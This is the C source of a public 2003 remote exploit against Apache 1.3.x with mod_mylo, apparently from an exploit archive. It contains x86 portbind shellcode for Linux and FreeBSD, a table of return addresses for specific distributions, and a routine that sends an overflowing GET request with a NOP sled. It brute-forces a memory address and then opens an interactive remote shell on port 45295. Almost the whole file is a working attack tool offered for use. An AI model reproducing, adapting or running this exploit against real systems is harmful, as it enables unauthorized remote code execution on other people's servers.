<html><head><title>Apache 1.3.x mod_mylo Remote Code Execution Exploit</title></head><pre>/*
  Apache + mod_mylo remote exploit
  By Carl Livitt / July 2003
  carllivitt at hush dot com

  Public release - Linux and FreeBSD targets.
*/
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;net/if.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;signal.h&gt;
#include &lt;netdb.h&gt;
#include &lt;time.h&gt;
#include &lt;stdarg.h&gt;

#define SIZ 8096
#define HTTP_PORT 80
#define SHELL_PORT 45295
#define SOCKET_ERR -2
#define CONNECT_ERR -3
#define HOST_NOT_RESOLVED -4
#define BRUTE_FORCE_EXHAUSTED -5
#define SHELL_NOT_FOUND -7
#define SUCCESS 1
#define FAILED 0

// The following shellcode had 0x3f (?) chars in it which
// cause termination of our HTTP GET before the whole
// shellcode is written to the stack. The 0x3f's are
// needed because they are the dup2() syscall numbers. So,
// I've changed them to 0x3e's and INC'd them before doing
// an INT 0x80. Other than that, this shellcode is eSDee's.
// --------
// linux x86 shellcode by eSDee of Netric (www.netric.org)
// 200 byte - forking portbind shellcode - port=0xb0ef(45295)
char linux_shellcode[]=
        &quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1&quot;
        &quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
        &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot;
        &quot;\x89\xc1\x31\xc0\x31\xdb\x50\x50&quot;
        &quot;\x50\x66\x68\xb0\xef\xb3\x02\x66&quot;
        &quot;\x53\x89\xe2\xb3\x10\x53\xb3\x02&quot;
        &quot;\x52\x51\x89\xca\x89\xe1\xb0\x66&quot;
        &quot;\xcd\x80\x31\xdb\x39\xc3\x74\x05&quot;
        &quot;\x31\xc0\x40\xcd\x80\x31\xc0\x50&quot;
        &quot;\x52\x89\xe1\xb3\x04\xb0\x66\xcd&quot;
        &quot;\x80\x89\xd7\x31\xc0\x31\xdb\x31&quot;
        &quot;\xc9\xb3\x11\xb1\x01\xb0\x30\xcd&quot;
        &quot;\x80\x31\xc0\x31\xdb\x50\x50\x57&quot;
        &quot;\x89\xe1\xb3\x05\xb0\x66\xcd\x80&quot;
        &quot;\x89\xc6\x31\xc0\x31\xdb\xb0\x02&quot;
        &quot;\xcd\x80\x39\xc3\x75\x40\x31\xc0&quot;
        &quot;\x89\xfb\xb0\x06\xcd\x80\x31\xc0&quot;
        &quot;\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80&quot;
        &quot;\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31&quot;
        &quot;\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0&quot;
        &quot;\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
        &quot;\x62\x69\x6e\x89\xe3\x8b\x54\x24&quot;
        &quot;\x08\x50\x53\x89\xe1\xb0\x0b\xcd&quot;
        &quot;\x80\x31\xc0\x40\xcd\x80\x31\xc0&quot;
        &quot;\x89\xf3\xb0\x06\xcd\x80\xeb\x99&quot;;

// This shellcode is unchanged (why reinvent the wheel ?):
// --------
/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * 194 byte - forking portbind shellcode - port=0xb0ef(45295)
 */
char freebsd_shellcode[]=
        &quot;\x31\xc0\x31\xdb\x53\xb3\x06\x53&quot;
        &quot;\xb3\x01\x53\xb3\x02\x53\x54\xb0&quot;
        &quot;\x61\xcd\x80\x89\xc7\x31\xc0\x50&quot;
        &quot;\x50\x50\x66\x68\xb0\xef\xb7\x02&quot;
        &quot;\x66\x53\x89\xe1\x31\xdb\xb3\x10&quot;
        &quot;\x53\x51\x57\x50\xb0\x68\xcd\x80&quot;
        &quot;\x31\xdb\x39\xc3\x74\x06\x31\xc0&quot;
        &quot;\xb0\x01\xcd\x80\x31\xc0\x50\x57&quot;
        &quot;\x50\xb0\x6a\xcd\x80\x31\xc0\x31&quot;
        &quot;\xdb\x50\x89\xe1\xb3\x01\x53\x89&quot;
        &quot;\xe2\x50\x51\x52\xb3\x14\x53\x50&quot;
        &quot;\xb0\x2e\xcd\x80\x31\xc0\x50\x50&quot;
        &quot;\x57\x50\xb0\x1e\xcd\x80\x89\xc6&quot;
        &quot;\x31\xc0\x31\xdb\xb0\x02\xcd\x80&quot;
        &quot;\x39\xc3\x75\x44\x31\xc0\x57\x50&quot;
        &quot;\xb0\x06\xcd\x80\x31\xc0\x50\x56&quot;
        &quot;\x50\xb0\x5a\xcd\x80\x31\xc0\x31&quot;
        &quot;\xdb\x43\x53\x56\x50\xb0\x5a\xcd&quot;
        &quot;\x80\x31\xc0\x43\x53\x56\x50\xb0&quot;
        &quot;\x5a\xcd\x80\x31\xc0\x50\x68\x2f&quot;
        &quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e&quot;
        &quot;\x89\xe3\x50\x54\x53\x50\xb0\x3b&quot;
        &quot;\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;
        &quot;\x31\xc0\x56\x50\xb0\x06\xcd\x80&quot;
        &quot;\xeb\x9a&quot;;

struct {
        char *platform;
        unsigned long bruteStart, bruteEnd;
        unsigned long retAddr;
        int offset, len;
        char *shellcodePtr;
} targets[]= {
        { &quot;SuSE 8.1, Apache 1.3.27 (installed from source) (default)&quot;, 0x08117c04,
0x08117dff, 0xbfffe9f0, 500, 4104, linux_shellcode },
        { &quot;RedHat 7.2, Apache 1.3.20 (installed from RPM)&quot;, 0x08105104, 0x081051ff,
0xbfffe0b0, 1000, 4104, linux_shellcode },
        { &quot;RedHat 7.3, Apache 1.3.23 (installed from RPM)&quot;, 0x080ef304, 0x080ef3ff,
0xbfffe190, 750, 4104, linux_shellcode },
        { &quot;FreeBSD 4.8, Apache 1.3.27 (from Ports)&quot;, 0x080bf004, 0x080bf0ff, 0xbfbfea50
,3500, 4096, freebsd_shellcode },
        NULL
};

char usage[]=
&quot;Apache + mod_mylo remote exploit\n&quot;
&quot;By Carl Livitt (carllivitt at hush dot com)\n\n&quot;
&quot;Arguments: \n&quot;
&quot;  -t target       Attack 'target' host\n&quot;
&quot;  -T platform     Use parameters for target 'platform'\n&quot;
&quot;  -h              This help.\n&quot;;

void my_send(int, char *, ...);
void my_recv(int);
void make_exploitbuf(char *);
int connect_to_host(int);
int attempt_exploit(void);
void my_sleep(int n);

unsigned long retAddr=0,magic_r=0,MAGIC_R_START,MAGIC_R_END, exactPointerAddy=0;
char buf[SIZ], host[SIZ]=&quot;&quot;;
int useTarget=0;
struct hostent *hostStruct;

main(int argc, char **argv) {
        int ch, i;

        while((ch=getopt(argc, argv, &quot;t:T:e:hr:&quot;))!=-1) {
                switch(ch) {
                        case 't':
                                strncpy(host, optarg, SIZ-1);
                                break;
                        case 'T':
                                useTarget=atoi(optarg);
                                break;
                        case 'e':
                                exactPointerAddy=strtoul(optarg,NULL,16);
                                break;
                        case 'r':
                                retAddr=strtoul(optarg,NULL,16);
                                break;
                        case 'h':
                        default:
                                printf(&quot;%s\n&quot;,usage);
                                printf(&quot;Available platforms:\n&quot;);
                                for(i=0;targets[i].platform;i++)
                                        printf(&quot;%2d. %s\n&quot;, i, targets[i].platform);
                                printf(&quot;\n&quot;);
                                exit(0);
                                break; // it's good practice :)
                }
        }

        // Sanity check
        if(!retAddr &amp;&amp; exactPointerAddy) {
                printf(&quot;[*] You must give RET address when specifying a pointer address\n&quot;);
                printf(&quot;    A good place to start is 0xbfffe0b0(linux) or 0xbfbfe0b0(freeBSD)\n&quot;);
		printf(&quot;    Also remember to pass a -T x flag... things will be unpredictable\n&quot;);
		printf(&quot;    if you don't!\n&quot;);
                exit(0);
        }

        if((hostStruct=gethostbyname(host))==NULL) {
               printf(&quot;[*] Couldn't resolve host %s\nUse '%s -h' for help\n&quot;, host,argv[0]);
                exit(0);
        }

        switch(attempt_exploit()) {
                case HOST_NOT_RESOLVED:
                        printf(&quot;[*] Couldn't connect to host: %s not found.\n&quot;, host);
                        break;
                case SOCKET_ERR:
                        printf(&quot;[*] Couldn't grab a socket!\n&quot;);
                        break;
                case CONNECT_ERR:
                        printf(&quot;[*] Connection to %s was rejected\n&quot;,host);
                        break;
                case SHELL_NOT_FOUND:
                        printf(&quot;[*] This attempt failed ...\n&quot;);
                        break;
                case BRUTE_FORCE_EXHAUSTED:
                        printf(&quot;[*] Bruteforce failed.\n&quot;);
                        break;
                case SUCCESS:
                        break;
                default:
                        printf(&quot;[*] ERROR: There was no error!\n&quot;);
                        break;
        }

        printf(&quot;\nHave a nice day!\n&quot;);
        exit(0);
}

int attempt_exploit(void) {
	fd_set rfds;
	int sock,retVal,r;

	if(exactPointerAddy) {
		printf(&quot;[-] Using 0x%08x for pointer addy\n&quot;, exactPointerAddy);
		if((sock=connect_to_host(HTTP_PORT))&lt;=0)
			return sock;
		magic_r=exactPointerAddy;
		make_exploitbuf(buf);
		my_send(sock, buf);
		my_recv(sock);
		close(sock);
		my_sleep(100000);
                if((sock=connect_to_host(SHELL_PORT))&lt;=0) {
			return sock;
		}
	} else { // Do crappy bruteforce loop
		printf(&quot;[-] Attempting attack [ %s ] ...\n&quot;, targets[useTarget].platform);
		MAGIC_R_START=targets[useTarget].bruteStart;
		MAGIC_R_END=targets[useTarget].bruteEnd;
		retAddr=targets[useTarget].retAddr;
		for(magic_r=MAGIC_R_START; magic_r&lt;=MAGIC_R_END; magic_r++) {
			printf(&quot;[-] Trying 0x%08x ... \r&quot;, magic_r);fflush(stdout);
			if((sock=connect_to_host(HTTP_PORT))&lt;=0)
				return sock;
			make_exploitbuf(buf);
			my_send(sock, buf);
			my_recv(sock);
			close(sock);
			my_sleep(50000);
			if((sock=connect_to_host(SHELL_PORT))&gt;=SUCCESS) {
				printf(&quot;\n[-] Found request_rec address @ 0x%08x\n&quot;, magic_r);
				break;
			}
		}
		if(magic_r&gt;MAGIC_R_END)
			return BRUTE_FORCE_EXHAUSTED;
	}

        printf(&quot;[-] Connected to %s! You can type commands now:\n&quot;, host);

        // Now let the attacker issue commands to the remote
        // shell, just as if (s)he had launched 'nc host 45295'.
        do {
                FD_ZERO(&amp;rfds);
                FD_SET(0, &amp;rfds);
                FD_SET(sock, &amp;rfds);
                retVal=select(sock+1, &amp;rfds, NULL, NULL, NULL);
                if(retVal) {
                        if(FD_ISSET(sock, &amp;rfds)) {
                                buf[(r=recv(sock, buf, SIZ-1,0))]='\0'; // bad!
                                printf(&quot;%s&quot;, buf);
                        }
                        if(FD_ISSET(0, &amp;rfds)) {
                                buf[(r=read(0, buf, SIZ-1))]='\0'; // bad!
                                send(sock, buf, strlen(buf), 0);
                        }

                }
        } while(retVal &amp;&amp; r); // loop until connection terminates

        close(sock);
        return SUCCESS;
}

// Given a port number, connects to an already resolved hostname...
// connects a TCP stream and returns a socket number (or returns error)
int connect_to_host(int p) {
        int sock;
        struct sockaddr_in saddr;

        if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
                return SOCKET_ERR;
        memset((void *)&amp;saddr, 0, sizeof(struct sockaddr_in));
        saddr.sin_family=AF_INET;
        saddr.sin_addr.s_addr=*((unsigned long *)hostStruct-&gt;h_addr_list[0]);
        saddr.sin_port=htons(p);
        if(connect(sock, (struct sockaddr *)&amp;saddr, sizeof(saddr))&lt;0) {
                close(sock);
                return CONNECT_ERR;
        } else
                return sock;
}

void make_exploitbuf(char *b) {
        unsigned long *ptr;
        char *sc=(char *)&amp;targets[useTarget].shellcodePtr[0];

        memset(b,0x00,SIZ-1);
        strcat(b,&quot;GET &quot;);
        memset(b+4,0x90,targets[useTarget].len);
        memcpy((b+targets[useTarget].len)-(strlen(sc)+targets[useTarget].offset)-9,sc,strlen(sc));
        ptr=(unsigned long *)&amp;b[strlen(b)];
        *(ptr++)=retAddr;
        *ptr=magic_r;
        strcat(b, &quot;\n\n&quot;);
}

// Handy little function to send formattable data down a socket.
void my_send(int s, char *b, ...) {
        va_list ap;
        char *buf;

        va_start(ap,b);
        vasprintf(&amp;buf,b,ap);
        send(s,buf,strlen(buf),0);
        va_end(ap);
        free(buf);
}

// Another handy function to read data from a socket.
void my_recv(int s) {
        int len;
        char buf[SIZ];

        len=recv(s, buf, SIZ-1, 0);
        buf[len]=0;
}

// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.
void my_sleep(int n) {
        struct timespec t;
        t.tv_sec=0;
        t.tv_nsec=n;
        nanosleep(&amp;t,&amp;t);
}

// milw0rm.com [2003-07-28]</pre></html>